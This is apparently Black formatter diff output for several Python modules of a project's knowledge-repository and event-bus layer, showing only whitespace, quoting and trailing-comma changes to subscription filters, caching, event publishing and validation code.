+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/knowledge_subscriber.py	2025-06-19 04:03:50.545338+00:00
@@ -9,306 +9,310 @@
 import re
 from typing import Any, Callable, Dict, List, Optional, Set, Tuple, Union, Pattern
 
 from fs_agt_clean.core.monitoring import get_logger
 from fs_agt_clean.core.coordination.event_system import (
-    Event, EventType, EventPriority, create_subscriber,
-    SubscriptionFilter as EventSubscriptionFilter
+    Event,
+    EventType,
+    EventPriority,
+    create_subscriber,
+    SubscriptionFilter as EventSubscriptionFilter,
 )
 from fs_agt_clean.core.coordination.knowledge_repository.knowledge_repository import (
-    KnowledgeItem, KnowledgeType, KnowledgeStatus, KnowledgeError
+    KnowledgeItem,
+    KnowledgeType,
+    KnowledgeStatus,
+    KnowledgeError,
 )
 
 
 # Type for knowledge notification handlers
 KnowledgeHandler = Callable[[KnowledgeItem], None]
 
 
 class SubscriptionFilter(abc.ABC):
     """
     Interface for knowledge subscription filters.
-    
+
     Subscription filters determine which knowledge items a subscriber
     receives notifications for.
     """
-    
+
     @abc.abstractmethod
     def matches(self, knowledge: KnowledgeItem) -> bool:
         """
         Check if a knowledge item matches the filter.
-        
-        Args:
-            knowledge: Knowledge item to check
-            
+
+        Args:
+            knowledge: Knowledge item to check
+
         Returns:
             True if the knowledge item matches the filter
         """
         pass
 
 
 class TopicFilter(SubscriptionFilter):
     """
     Filter for knowledge topics.
-    
+
     This filter matches knowledge items with specific topics.
     """
-    
+
     def __init__(self, topics: Set[str]):
         """
         Initialize a topic filter.
-        
+
         Args:
             topics: Set of topics to match
         """
         self.topics = topics
-    
-    def matches(self, knowledge: KnowledgeItem) -> bool:
-        """
-        Check if a knowledge item matches the filter.
-        
-        Args:
-            knowledge: Knowledge item to check
-            
+
+    def matches(self, knowledge: KnowledgeItem) -> bool:
+        """
+        Check if a knowledge item matches the filter.
+
+        Args:
+            knowledge: Knowledge item to check
+
         Returns:
             True if the knowledge item's topic is in the filter's topics
         """
         return knowledge.topic in self.topics
 
 
 class SourceFilter(SubscriptionFilter):
     """
     Filter for knowledge sources.
-    
+
     This filter matches knowledge items from specific sources.
     """
-    
+
     def __init__(self, sources: Set[str]):
         """
         Initialize a source filter.
-        
+
         Args:
             sources: Set of source IDs to match
         """
         self.sources = sources
-    
-    def matches(self, knowledge: KnowledgeItem) -> bool:
-        """
-        Check if a knowledge item matches the filter.
-        
-        Args:
-            knowledge: Knowledge item to check
-            
+
+    def matches(self, knowledge: KnowledgeItem) -> bool:
+        """
+        Check if a knowledge item matches the filter.
+
+        Args:
+            knowledge: Knowledge item to check
+
         Returns:
             True if the knowledge item's source is in the filter's sources
         """
         return knowledge.source_id in self.sources if knowledge.source_id else False
 
 
 class TypeFilter(SubscriptionFilter):
     """
     Filter for knowledge types.
-    
+
     This filter matches knowledge items with specific types.
     """
-    
+
     def __init__(self, types: Set[KnowledgeType]):
         """
         Initialize a type filter.
-        
+
         Args:
             types: Set of knowledge types to match
         """
         self.types = types
-    
-    def matches(self, knowledge: KnowledgeItem) -> bool:
-        """
-        Check if a knowledge item matches the filter.
-        
-        Args:
-            knowledge: Knowledge item to check
-            
+
+    def matches(self, knowledge: KnowledgeItem) -> bool:
+        """
+        Check if a knowledge item matches the filter.
+
+        Args:
+            knowledge: Knowledge item to check
+
         Returns:
             True if the knowledge item's type is in the filter's types
         """
         return knowledge.knowledge_type in self.types
 
 
 class TagFilter(SubscriptionFilter):
     """
     Filter for knowledge tags.
-    
+
     This filter matches knowledge items with specific tags.
     """
-    
+
     def __init__(self, tags: Set[str], match_all: bool = False):
         """
         Initialize a tag filter.
-        
+
         Args:
             tags: Set of tags to match
             match_all: If True, all tags must match; if False, any tag can match
         """
         self.tags = tags
         self.match_all = match_all
-    
-    def matches(self, knowledge: KnowledgeItem) -> bool:
-        """
-        Check if a knowledge item matches the filter.
-        
-        Args:
-            knowledge: Knowledge item to check
-            
+
+    def matches(self, knowledge: KnowledgeItem) -> bool:
+        """
+        Check if a knowledge item matches the filter.
+
+        Args:
+            knowledge: Knowledge item to check
+
         Returns:
             True if the knowledge item's tags match the filter's tags
         """
         if not knowledge.tags:
             return False
-        
+
         if self.match_all:
             return self.tags.issubset(knowledge.tags)
         else:
             return bool(self.tags.intersection(knowledge.tags))
 
 
 class TopicPatternFilter(SubscriptionFilter):
     """
     Filter for knowledge topics using regex patterns.
-    
+
     This filter matches knowledge items with topics that match specific patterns.
     """
-    
+
     def __init__(self, patterns: List[str]):
         """
         Initialize a topic pattern filter.
-        
+
         Args:
             patterns: List of regex patterns to match
         """
         self.patterns = [re.compile(pattern) for pattern in patterns]
-    
-    def matches(self, knowledge: KnowledgeItem) -> bool:
-        """
-        Check if a knowledge item matches the filter.
-        
-        Args:
-            knowledge: Knowledge item to check
-            
+
+    def matches(self, knowledge: KnowledgeItem) -> bool:
+        """
+        Check if a knowledge item matches the filter.
+
+        Args:
+            knowledge: Knowledge item to check
+
         Returns:
             True if the knowledge item's topic matches any of the filter's patterns
         """
         return any(pattern.search(knowledge.topic) for pattern in self.patterns)
 
 
 class CompositeFilter(SubscriptionFilter):
     """
     Composite filter combining multiple filters.
-    
+
     This filter combines multiple filters using logical operations.
     """
-    
+
     def __init__(self, filters: List[SubscriptionFilter], match_all: bool = True):
         """
         Initialize a composite filter.
-        
+
         Args:
             filters: List of filters to combine
             match_all: If True, all filters must match; if False, any filter can match
         """
         self.filters = filters
         self.match_all = match_all
-    
-    def matches(self, knowledge: KnowledgeItem) -> bool:
-        """
-        Check if a knowledge item matches the filter.
-        
-        Args:
-            knowledge: Knowledge item to check
-            
+
+    def matches(self, knowledge: KnowledgeItem) -> bool:
+        """
+        Check if a knowledge item matches the filter.
+
+        Args:
+            knowledge: Knowledge item to check
+
         Returns:
             True if the knowledge item matches the composite filter
         """
         if not self.filters:
             return True
-        
+
         if self.match_all:
             return all(f.matches(knowledge) for f in self.filters)
         else:
             return any(f.matches(knowledge) for f in self.filters)
 
 
 class CustomFilter(SubscriptionFilter):
     """
     Custom filter using a callback function.
-    
+
     This filter uses a custom callback function to determine matches.
     """
-    
+
     def __init__(self, callback: Callable[[KnowledgeItem], bool]):
         """
         Initialize a custom filter.
-        
+
         Args:
             callback: Function that takes a knowledge item and returns a boolean
         """
         self.callback = callback
-    
-    def matches(self, knowledge: KnowledgeItem) -> bool:
-        """
-        Check if a knowledge item matches the filter.
-        
-        Args:
-            knowledge: Knowledge item to check
-            
+
+    def matches(self, knowledge: KnowledgeItem) -> bool:
+        """
+        Check if a knowledge item matches the filter.
+
+        Args:
+            knowledge: Knowledge item to check
+
         Returns:
             True if the knowledge item matches the custom filter
         """
         return self.callback(knowledge)
 
 
 class KnowledgeSubscriber(abc.ABC):
     """
     Interface for knowledge subscribers.
-    
+
     Knowledge subscribers receive notifications about knowledge updates
     in the knowledge repository.
     """
-    
+
     @abc.abstractmethod
     async def subscribe(
-        self,
-        filter: Optional[SubscriptionFilter],
-        handler: KnowledgeHandler
+        self, filter: Optional[SubscriptionFilter], handler: KnowledgeHandler
     ) -> str:
         """
         Subscribe to knowledge updates.
-        
+
         Args:
             filter: Filter for knowledge items
             handler: Handler for knowledge notifications
-            
+
         Returns:
             Subscription ID
         """
         pass
-    
+
     @abc.abstractmethod
     async def unsubscribe(self, subscription_id: str) -> bool:
         """
         Unsubscribe from knowledge updates.
-        
+
         Args:
             subscription_id: ID of the subscription
-            
+
         Returns:
             True if the subscription was removed
         """
         pass
-    
+
     @abc.abstractmethod
     async def get_subscriptions(self) -> List[Dict[str, Any]]:
         """
         Get all subscriptions for this subscriber.
-        
+
         Returns:
             List of subscription information
         """
         pass
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/knowledge_subscriber.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/knowledge_cache.py	2025-06-14 20:35:30.787733+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/knowledge_cache.py	2025-06-19 04:03:50.623854+00:00
@@ -12,16 +12,20 @@
 from enum import Enum, auto
 from typing import Any, Dict, List, Optional, Set, Tuple, Union
 
 from fs_agt_clean.core.monitoring import get_logger
 from fs_agt_clean.core.coordination.knowledge_repository.knowledge_repository import (
-    KnowledgeItem, KnowledgeType, KnowledgeStatus, KnowledgeError
+    KnowledgeItem,
+    KnowledgeType,
+    KnowledgeStatus,
+    KnowledgeError,
 )
 
 
 class CacheStrategy(Enum):
     """Cache replacement strategies."""
+
     LRU = auto()  # Least Recently Used
     LFU = auto()  # Least Frequently Used
     FIFO = auto()  # First In, First Out
     PRIORITY = auto()  # Priority-based
 
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/knowledge_cache.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/event_system/event_bus.py	2025-06-14 20:35:30.783724+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/event_system/event_bus.py	2025-06-19 04:03:50.677886+00:00
@@ -20,21 +20,34 @@
 import time
 import uuid
 from collections import defaultdict, deque
 from datetime import datetime, timedelta
 from pathlib import Path
-from typing import Any, Awaitable, Callable, Dict, List, Optional, Set, Tuple, Type, Union
+from typing import (
+    Any,
+    Awaitable,
+    Callable,
+    Dict,
+    List,
+    Optional,
+    Set,
+    Tuple,
+    Type,
+    Union,
+)
 
 from fs_agt_clean.core.monitoring import get_logger, record_metric, create_alert
 from fs_agt_clean.core.monitoring.models import MetricType, MetricCategory, AlertLevel
 
 # Import event system components
 from fs_agt_clean.core.coordination.event_system.event import Event, EventType
+
 
 # Define Subscription class for type hints until circular imports are resolved
 class Subscription:
     """Placeholder for Subscription class to avoid circular imports."""
+
     id: str
     subscriber_id: str
     is_active: bool
 
     async def matches(self, event: Event) -> bool:
@@ -53,11 +66,11 @@
 
     def __init__(
         self,
         message: str,
         event_id: Optional[str] = None,
-        cause: Optional[Exception] = None
+        cause: Optional[Exception] = None,
     ):
         """
         Initialize an event bus error.
 
         Args:
@@ -152,11 +165,11 @@
         event_type: Optional[EventType] = None,
         source: Optional[str] = None,
         target: Optional[str] = None,
         start_time: Optional[datetime] = None,
         end_time: Optional[datetime] = None,
-        limit: int = 100
+        limit: int = 100,
     ) -> List[Event]:
         """
         Get events matching the given criteria.
 
         Args:
@@ -181,11 +194,11 @@
         event_type: Optional[EventType] = None,
         source: Optional[str] = None,
         target: Optional[str] = None,
         start_time: Optional[datetime] = None,
         end_time: Optional[datetime] = None,
-        limit: int = 100
+        limit: int = 100,
     ) -> None:
         """
         Replay events matching the given criteria.
 
         Args:
@@ -200,11 +213,13 @@
             EventBusError: If the events cannot be replayed
         """
         pass
 
     @abc.abstractmethod
-    async def get_dead_letter_events(self, limit: int = 100) -> List[Tuple[Event, Exception]]:
+    async def get_dead_letter_events(
+        self, limit: int = 100
+    ) -> List[Tuple[Event, Exception]]:
         """
         Get events that could not be delivered.
 
         Args:
             limit: Maximum number of events to get
@@ -275,11 +290,11 @@
         bus_id: str,
         logger: Optional[logging.Logger] = None,
         persistence_enabled: bool = True,
         max_retry_attempts: int = 3,
         retry_delay_seconds: float = 1.0,
-        mobile_optimized: bool = False
+        mobile_optimized: bool = False,
     ):
         """
         Initialize the base event bus.
 
         Args:
@@ -347,22 +362,22 @@
                     "event_id": event.event_id,
                     "event_type": event.event_type.value,
                     "event_name": event.metadata.event_name,
                     "correlation_id": event.correlation_id,
                     "matching_subscriptions": len(matching_subscriptions),
-                }
+                },
             )
         except Exception as e:
             error_msg = f"Failed to publish event {event.event_id}: {str(e)}"
             self.logger.error(
                 error_msg,
                 extra={
                     "event_id": event.event_id,
                     "event_type": event.event_type.value,
                     "error": str(e),
                 },
-                exc_info=True
+                exc_info=True,
             )
 
             # Create an alert for the failure
             await create_alert(
                 title="Event Publish Failure",
@@ -372,11 +387,11 @@
                 source="system",
                 details={
                     "event_id": event.event_id,
                     "event_type": event.event_type.value,
                     "error": str(e),
-                }
+                },
             )
 
             raise EventBusError(error_msg, event_id=event.event_id, cause=e)
 
     async def publish_batch(self, events: List[Event]) -> None:
@@ -409,21 +424,21 @@
 
             self.logger.debug(
                 f"Published batch of {len(events)} events",
                 extra={
                     "event_count": len(events),
-                }
+                },
             )
         except Exception as e:
             error_msg = f"Failed to publish batch of {len(events)} events: {str(e)}"
             self.logger.error(
                 error_msg,
                 extra={
                     "event_count": len(events),
                     "error": str(e),
                 },
-                exc_info=True
+                exc_info=True,
             )
 
             # Create an alert for the failure
             await create_alert(
                 title="Event Batch Publish Failure",
@@ -432,11 +447,11 @@
                 category="event_system",
                 source="system",
                 details={
                     "event_count": len(events),
                     "error": str(e),
-                }
+                },
             )
 
             raise EventBusError(error_msg, cause=e)
 
     async def register_subscription(self, subscription: Subscription) -> None:
@@ -459,22 +474,22 @@
             self.logger.debug(
                 f"Registered subscription {subscription.id} for {subscription.subscriber_id}",
                 extra={
                     "subscription_id": subscription.id,
                     "subscriber_id": subscription.subscriber_id,
-                }
+                },
             )
         except Exception as e:
             error_msg = f"Failed to register subscription {subscription.id}: {str(e)}"
             self.logger.error(
                 error_msg,
                 extra={
                     "subscription_id": subscription.id,
                     "subscriber_id": subscription.subscriber_id,
                     "error": str(e),
                 },
-                exc_info=True
+                exc_info=True,
             )
             raise EventBusError(error_msg, cause=e)
 
     async def unregister_subscription(self, subscription: Subscription) -> None:
         """
@@ -497,22 +512,22 @@
             self.logger.debug(
                 f"Unregistered subscription {subscription.id} for {subscription.subscriber_id}",
                 extra={
                     "subscription_id": subscription.id,
                     "subscriber_id": subscription.subscriber_id,
-                }
+                },
             )
         except Exception as e:
             error_msg = f"Failed to unregister subscription {subscription.id}: {str(e)}"
             self.logger.error(
                 error_msg,
                 extra={
                     "subscription_id": subscription.id,
                     "subscriber_id": subscription.subscriber_id,
                     "error": str(e),
                 },
-                exc_info=True
+                exc_info=True,
             )
             raise EventBusError(error_msg, cause=e)
 
     async def get_event(self, event_id: str) -> Optional[Event]:
         """
@@ -546,22 +561,22 @@
                 error_msg,
                 extra={
                     "event_id": event_id,
                     "error": str(e),
                 },
-                exc_info=True
+                exc_info=True,
             )
             raise EventBusError(error_msg, event_id=event_id, cause=e)
 
     async def get_events(
         self,
         event_type: Optional[EventType] = None,
         source: Optional[str] = None,
         target: Optional[str] = None,
         start_time: Optional[datetime] = None,
         end_time: Optional[datetime] = None,
-        limit: int = 100
+        limit: int = 100,
     ) -> List[Event]:
         """
         Get events matching the given criteria.
 
         Args:
@@ -584,11 +599,11 @@
                 event_type=event_type,
                 source=source,
                 target=target,
                 start_time=start_time,
                 end_time=end_time,
-                limit=limit
+                limit=limit,
             )
         except Exception as e:
             error_msg = f"Failed to get events: {str(e)}"
             self.logger.error(
                 error_msg,
@@ -596,22 +611,22 @@
                     "event_type": event_type.value if event_type else None,
                     "source": source,
                     "target": target,
                     "error": str(e),
                 },
-                exc_info=True
+                exc_info=True,
             )
             raise EventBusError(error_msg, cause=e)
 
     async def replay_events(
         self,
         event_type: Optional[EventType] = None,
         source: Optional[str] = None,
         target: Optional[str] = None,
         start_time: Optional[datetime] = None,
         end_time: Optional[datetime] = None,
-        limit: int = 100
+        limit: int = 100,
     ) -> None:
         """
         Replay events matching the given criteria.
 
         Args:
@@ -631,11 +646,11 @@
                 event_type=event_type,
                 source=source,
                 target=target,
                 start_time=start_time,
                 end_time=end_time,
-                limit=limit
+                limit=limit,
             )
 
             # Replay each event
             for event in events:
                 # Find matching subscriptions
@@ -649,11 +664,11 @@
                 extra={
                     "event_count": len(events),
                     "event_type": event_type.value if event_type else None,
                     "source": source,
                     "target": target,
-                }
+                },
             )
         except Exception as e:
             error_msg = f"Failed to replay events: {str(e)}"
             self.logger.error(
                 error_msg,
@@ -661,15 +676,17 @@
                     "event_type": event_type.value if event_type else None,
                     "source": source,
                     "target": target,
                     "error": str(e),
                 },
-                exc_info=True
+                exc_info=True,
             )
             raise EventBusError(error_msg, cause=e)
 
-    async def get_dead_letter_events(self, limit: int = 100) -> List[Tuple[Event, Exception]]:
+    async def get_dead_letter_events(
+        self, limit: int = 100
+    ) -> List[Tuple[Event, Exception]]:
         """
         Get events that could not be delivered.
 
         Args:
             limit: Maximum number of events to get
@@ -690,11 +707,11 @@
                 error_msg,
                 extra={
                     "limit": limit,
                     "error": str(e),
                 },
-                exc_info=True
+                exc_info=True,
             )
             raise EventBusError(error_msg, cause=e)
 
     async def retry_dead_letter_event(self, event_id: str) -> bool:
         """
@@ -722,11 +739,11 @@
 
             self.logger.info(
                 f"Retried dead letter event {event_id}",
                 extra={
                     "event_id": event_id,
-                }
+                },
             )
 
             return True
         except Exception as e:
             error_msg = f"Failed to retry dead letter event {event_id}: {str(e)}"
@@ -734,11 +751,11 @@
                 error_msg,
                 extra={
                     "event_id": event_id,
                     "error": str(e),
                 },
-                exc_info=True
+                exc_info=True,
             )
             raise EventBusError(error_msg, event_id=event_id, cause=e)
 
     async def clear_dead_letter_event(self, event_id: str) -> bool:
         """
@@ -763,11 +780,11 @@
 
             self.logger.info(
                 f"Cleared dead letter event {event_id}",
                 extra={
                     "event_id": event_id,
-                }
+                },
             )
 
             return True
         except Exception as e:
             error_msg = f"Failed to clear dead letter event {event_id}: {str(e)}"
@@ -775,11 +792,11 @@
                 error_msg,
                 extra={
                     "event_id": event_id,
                     "error": str(e),
                 },
-                exc_info=True
+                exc_info=True,
             )
             raise EventBusError(error_msg, event_id=event_id, cause=e)
 
     async def get_metrics(self) -> Dict[str, Any]:
         """
@@ -816,11 +833,11 @@
             self.logger.error(
                 error_msg,
                 extra={
                     "error": str(e),
                 },
-                exc_info=True
+                exc_info=True,
             )
             raise EventBusError(error_msg, cause=e)
 
     # Abstract methods that must be implemented by subclasses
 
@@ -868,11 +885,13 @@
             Exception: If the subscriptions cannot be found
         """
         pass
 
     @abc.abstractmethod
-    async def _deliver_event(self, event: Event, subscriptions: List[Subscription]) -> None:
+    async def _deliver_event(
+        self, event: Event, subscriptions: List[Subscription]
+    ) -> None:
         """
         Deliver an event to subscribers.
 
         Args:
             event: The event to deliver
@@ -915,11 +934,11 @@
         event_type: Optional[EventType] = None,
         source: Optional[str] = None,
         target: Optional[str] = None,
         start_time: Optional[datetime] = None,
         end_time: Optional[datetime] = None,
-        limit: int = 100
+        limit: int = 100,
     ) -> List[Event]:
         """
         Get events matching the given criteria.
 
         Args:
@@ -960,6 +979,6 @@
             Dictionary of metrics
 
         Raises:
             Exception: If the metrics cannot be retrieved
         """
-        pass
\ No newline at end of file
+        pass
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/event_system/event_bus.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/knowledge_repository.py	2025-06-14 20:35:30.787733+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/knowledge_repository.py	2025-06-19 04:03:50.729140+00:00
@@ -17,10 +17,11 @@
 from fs_agt_clean.core.monitoring import get_logger
 
 
 class KnowledgeType(Enum):
     """Types of knowledge items."""
+
     FACT = auto()  # Factual information
     RULE = auto()  # Rules or constraints
     PROCEDURE = auto()  # Procedural knowledge
     CONCEPT = auto()  # Conceptual knowledge
     RELATION = auto()  # Relational knowledge
@@ -28,10 +29,11 @@
     OTHER = auto()  # Other types of knowledge
 
 
 class KnowledgeStatus(Enum):
     """Status of knowledge items."""
+
     DRAFT = auto()  # Draft knowledge, not yet validated
     ACTIVE = auto()  # Active knowledge, validated and available
     DEPRECATED = auto()  # Deprecated knowledge, still available but not recommended
     ARCHIVED = auto()  # Archived knowledge, not actively available
     INVALID = auto()  # Invalid knowledge, failed validation
@@ -42,11 +44,11 @@
 
     def __init__(
         self,
         message: str,
         knowledge_id: Optional[str] = None,
-        cause: Optional[Exception] = None
+        cause: Optional[Exception] = None,
     ):
         """
         Initialize a knowledge error.
 
         Args:
@@ -89,11 +91,11 @@
         updated_at: Optional[datetime] = None,
         status: KnowledgeStatus = KnowledgeStatus.DRAFT,
         version: int = 1,
         previous_version_id: Optional[str] = None,
         access_control: Optional[Dict[str, Any]] = None,
-        tags: Optional[Set[str]] = None
+        tags: Optional[Set[str]] = None,
     ):
         """
         Initialize a knowledge item.
 
         Args:
@@ -135,12 +137,12 @@
         content: Any,
         vector: Optional[np.ndarray] = None,
         metadata: Optional[Dict[str, Any]] = None,
         source_id: Optional[str] = None,
         access_control: Optional[Dict[str, Any]] = None,
-        tags: Optional[Set[str]] = None
-    ) -> 'KnowledgeItem':
+        tags: Optional[Set[str]] = None,
+    ) -> "KnowledgeItem":
         """
         Create a new knowledge item with a generated ID.
 
         Args:
             knowledge_type: Type of knowledge
@@ -163,21 +165,21 @@
             content=content,
             vector=vector,
             metadata=metadata,
             source_id=source_id,
             access_control=access_control,
-            tags=tags
+            tags=tags,
         )
 
     def update(
         self,
         content: Optional[Any] = None,
         vector: Optional[np.ndarray] = None,
         metadata: Optional[Dict[str, Any]] = None,
         status: Optional[KnowledgeStatus] = None,
-        tags: Optional[Set[str]] = None
-    ) -> 'KnowledgeItem':
+        tags: Optional[Set[str]] = None,
+    ) -> "KnowledgeItem":
         """
         Create an updated version of this knowledge item.
 
         Args:
             content: New content
@@ -205,11 +207,11 @@
             updated_at=datetime.now(),
             status=status if status is not None else self.status,
             version=self.version + 1,
             previous_version_id=self.knowledge_id,
             access_control=self.access_control,
-            tags=tags if tags is not None else self.tags
+            tags=tags if tags is not None else self.tags,
         )
 
     def is_active(self) -> bool:
         """
         Check if the knowledge item is active.
@@ -238,15 +240,15 @@
             "updated_at": self.updated_at.isoformat(),
             "status": self.status.name,
             "version": self.version,
             "previous_version_id": self.previous_version_id,
             "access_control": self.access_control,
-            "tags": list(self.tags)
+            "tags": list(self.tags),
         }
 
     @classmethod
-    def from_dict(cls, data: Dict[str, Any]) -> 'KnowledgeItem':
+    def from_dict(cls, data: Dict[str, Any]) -> "KnowledgeItem":
         """
         Create a knowledge item from a dictionary.
 
         Args:
             data: Dictionary representation of a knowledge item
@@ -282,11 +284,11 @@
             updated_at=updated_at,
             status=status,
             version=data.get("version", 1),
             previous_version_id=data.get("previous_version_id"),
             access_control=data.get("access_control", {}),
-            tags=tags
+            tags=tags,
         )
 
 
 class KnowledgeRepository(abc.ABC):
     """
@@ -390,11 +392,13 @@
             KnowledgeError: If the knowledge items cannot be retrieved
         """
         pass
 
     @abc.abstractmethod
-    async def get_knowledge_by_type(self, knowledge_type: KnowledgeType) -> List[KnowledgeItem]:
+    async def get_knowledge_by_type(
+        self, knowledge_type: KnowledgeType
+    ) -> List[KnowledgeItem]:
         """
         Get knowledge items by type.
 
         Args:
             knowledge_type: Type to search for
@@ -438,11 +442,13 @@
             KnowledgeError: If the knowledge items cannot be retrieved
         """
         pass
 
     @abc.abstractmethod
-    async def search_knowledge(self, query: str, limit: int = 10) -> List[Tuple[KnowledgeItem, float]]:
+    async def search_knowledge(
+        self, query: str, limit: int = 10
+    ) -> List[Tuple[KnowledgeItem, float]]:
         """
         Search for knowledge items by similarity to a query.
 
         Args:
             query: Query string
@@ -455,11 +461,13 @@
             KnowledgeError: If the search cannot be performed
         """
         pass
 
     @abc.abstractmethod
-    async def similar_knowledge(self, knowledge_id: str, limit: int = 10) -> List[Tuple[KnowledgeItem, float]]:
+    async def similar_knowledge(
+        self, knowledge_id: str, limit: int = 10
+    ) -> List[Tuple[KnowledgeItem, float]]:
         """
         Find knowledge items similar to a given knowledge item.
 
         Args:
             knowledge_id: ID of the knowledge item
@@ -472,11 +480,13 @@
             KnowledgeError: If the similarity search cannot be performed
         """
         pass
 
     @abc.abstractmethod
-    async def get_knowledge_version_history(self, knowledge_id: str) -> List[KnowledgeItem]:
+    async def get_knowledge_version_history(
+        self, knowledge_id: str
+    ) -> List[KnowledgeItem]:
         """
         Get the version history of a knowledge item.
 
         Args:
             knowledge_id: ID of the knowledge item
@@ -488,11 +498,13 @@
             KnowledgeError: If the version history cannot be retrieved
         """
         pass
 
     @abc.abstractmethod
-    async def get_knowledge_by_status(self, status: KnowledgeStatus) -> List[KnowledgeItem]:
+    async def get_knowledge_by_status(
+        self, status: KnowledgeStatus
+    ) -> List[KnowledgeItem]:
         """
         Get knowledge items by status.
 
         Args:
             status: Status to search for
@@ -517,11 +529,13 @@
             KnowledgeError: If the knowledge items cannot be retrieved
         """
         pass
 
     @abc.abstractmethod
-    async def get_knowledge_updates(self, since_timestamp: datetime) -> List[KnowledgeItem]:
+    async def get_knowledge_updates(
+        self, since_timestamp: datetime
+    ) -> List[KnowledgeItem]:
         """
         Get knowledge items updated since a timestamp.
 
         Args:
             since_timestamp: Timestamp to get updates since
@@ -533,11 +547,13 @@
             KnowledgeError: If the knowledge items cannot be retrieved
         """
         pass
 
     @abc.abstractmethod
-    async def get_critical_updates(self, since_timestamp: datetime, priority_threshold: float = 0.5) -> List[KnowledgeItem]:
+    async def get_critical_updates(
+        self, since_timestamp: datetime, priority_threshold: float = 0.5
+    ) -> List[KnowledgeItem]:
         """
         Get critical knowledge updates since a timestamp.
 
         This method is optimized for mobile devices with limited bandwidth.
         It returns only high-priority knowledge updates.
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/knowledge_repository.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/knowledge_validator.py	2025-06-14 20:35:30.787733+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/knowledge_validator.py	2025-06-19 04:03:50.881805+00:00
@@ -10,168 +10,177 @@
 import re
 from typing import Any, Dict, List, Optional, Set, Tuple, Union
 
 from fs_agt_clean.core.monitoring import get_logger
 from fs_agt_clean.core.coordination.knowledge_repository.knowledge_repository import (
-    KnowledgeItem, KnowledgeType, KnowledgeStatus, KnowledgeError
+    KnowledgeItem,
+    KnowledgeType,
+    KnowledgeStatus,
+    KnowledgeError,
 )
 
 
 class ValidationError(Exception):
     """Base exception for knowledge validation errors."""
-    
+
     def __init__(
         self,
         message: str,
         knowledge_id: Optional[str] = None,
         field: Optional[str] = None,
-        cause: Optional[Exception] = None
+        cause: Optional[Exception] = None,
     ):
         """
         Initialize a validation error.
-        
+
         Args:
             message: Error message
             knowledge_id: ID of the knowledge item related to the error
             field: Field that failed validation
             cause: Original exception that caused this error
         """
         self.message = message
         self.knowledge_id = knowledge_id
         self.field = field
         self.cause = cause
-        
+
         # Create a detailed error message
         detailed_message = message
         if knowledge_id:
             detailed_message += f" (knowledge_id: {knowledge_id})"
         if field:
             detailed_message += f" (field: {field})"
         if cause:
             detailed_message += f" - caused by: {str(cause)}"
-        
+
         super().__init__(detailed_message)
 
 
 class KnowledgeValidator(abc.ABC):
     """
     Interface for knowledge validators.
-    
+
     Knowledge validators validate knowledge items before they are added
     to the knowledge repository.
     """
-    
+
     @abc.abstractmethod
     async def validate(self, knowledge: KnowledgeItem) -> bool:
         """
         Validate a knowledge item.
-        
+
         Args:
             knowledge: Knowledge item to validate
-            
+
         Returns:
             True if the knowledge item is valid
-            
+
         Raises:
             ValidationError: If the knowledge item is invalid
         """
         pass
-    
+
     @abc.abstractmethod
     async def validate_batch(self, knowledge_items: List[KnowledgeItem]) -> List[bool]:
         """
         Validate multiple knowledge items.
-        
+
         Args:
             knowledge_items: Knowledge items to validate
-            
+
         Returns:
             List of validation results (True for valid, False for invalid)
         """
         pass
 
 
 class SchemaValidator(KnowledgeValidator):
     """
     Schema-based knowledge validator.
-    
+
     This validator validates knowledge items against JSON schemas.
     """
-    
-    def __init__(self, validator_id: str, schemas: Optional[Dict[str, Dict[str, Any]]] = None):
+
+    def __init__(
+        self, validator_id: str, schemas: Optional[Dict[str, Dict[str, Any]]] = None
+    ):
         """
         Initialize a schema validator.
-        
+
         Args:
             validator_id: Unique identifier for this validator
             schemas: Dictionary mapping topic patterns to JSON schemas
         """
         self.validator_id = validator_id
         self.logger = get_logger(f"knowledge_validator.{validator_id}")
         self.schemas = schemas or {}
-        self.topic_patterns = {re.compile(pattern): schema for pattern, schema in self.schemas.items()}
-    
+        self.topic_patterns = {
+            re.compile(pattern): schema for pattern, schema in self.schemas.items()
+        }
+
     def add_schema(self, topic_pattern: str, schema: Dict[str, Any]) -> None:
         """
         Add a schema for a topic pattern.
-        
+
         Args:
             topic_pattern: Regex pattern for topics
             schema: JSON schema for validation
         """
         self.schemas[topic_pattern] = schema
         self.topic_patterns[re.compile(topic_pattern)] = schema
-    
+
     def remove_schema(self, topic_pattern: str) -> bool:
         """
         Remove a schema for a topic pattern.
-        
+
         Args:
             topic_pattern: Regex pattern for topics
-            
+
         Returns:
             True if the schema was removed
         """
         if topic_pattern in self.schemas:
             del self.schemas[topic_pattern]
-            self.topic_patterns = {re.compile(pattern): schema for pattern, schema in self.schemas.items()}
+            self.topic_patterns = {
+                re.compile(pattern): schema for pattern, schema in self.schemas.items()
+            }
             return True
         return False
-    
+
     async def validate(self, knowledge: KnowledgeItem) -> bool:
         """
         Validate a knowledge item.
-        
+
         Args:
             knowledge: Knowledge item to validate
-            
+
         Returns:
             True if the knowledge item is valid
-            
+
         Raises:
             ValidationError: If the knowledge item is invalid
         """
         try:
             # Check if the knowledge item has content
             if knowledge.content is None:
                 raise ValidationError(
                     "Knowledge item has no content",
                     knowledge_id=knowledge.knowledge_id,
-                    field="content"
+                    field="content",
                 )
-            
+
             # Find a matching schema for the topic
             schema = None
             for pattern, s in self.topic_patterns.items():
                 if pattern.search(knowledge.topic):
                     schema = s
                     break
-            
+
             # If no schema is found, the item is valid
             if schema is None:
                 return True
-            
+
             # Validate the content against the schema
             # This is a simplified implementation
             # In a real implementation, use a proper JSON schema validator
             if isinstance(knowledge.content, dict):
                 # Check required fields
